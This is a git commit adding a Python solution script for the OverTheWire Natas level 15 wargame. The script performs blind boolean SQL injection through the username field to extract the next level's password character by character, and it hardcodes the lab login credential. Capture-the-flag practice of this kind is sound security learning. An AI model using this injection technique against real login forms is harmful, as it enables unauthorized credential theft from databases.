0d63a942f6b3f24bb89ac1214aae8ff40d29ff81
Nimish Mishra <neelam.nimish@gmail.com>
2020-09-05 07:58:22 +0530

    natas

---
+++ over_the_wire_challenges/natas/natas15.py
@@ -0,0 +1,22 @@
+import requests
+from requests.auth import HTTPBasicAuth
+
+chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
+filtered = ''
+passwd = ''
+
+for char in chars:
+    Data = {'username' : 'natas16" and password LIKE BINARY "%' + char + '%" #'}
+    r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+    if 'exists' in r.text :
+        filtered = filtered + char
+
+for i in range(0,32):
+    for char in filtered:
+        Data = {'username' : 'natas16" and password LIKE BINARY "' + passwd + char + '%" #'}
+        r = requests.post('http://natas15.natas.labs.overthewire.org/index.php?debug', auth=HTTPBasicAuth('natas15', 'AwWj0w5cvxrZiONgZ9J5stNVkmxdk39J'), data = Data)
+        if 'exists' in r.text :
+            passwd = passwd + char
+            print(passwd)
+            break
+
